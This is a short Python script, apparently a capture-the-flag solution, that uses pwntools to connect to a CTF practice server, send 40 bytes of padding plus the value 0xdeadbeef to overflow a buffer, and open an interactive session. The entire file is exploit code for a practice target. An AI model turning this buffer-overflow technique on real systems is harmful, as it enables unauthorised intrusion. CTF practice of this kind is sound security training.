#!/usr/bin/python3

import pwn

p = pwn.remote("ctf.j0n9hyun.xyz", 3000)

padding = b"A"*40

payload = padding + pwn.p32(0xdeadbeef)

p.sendline(payload)

p.interactive()
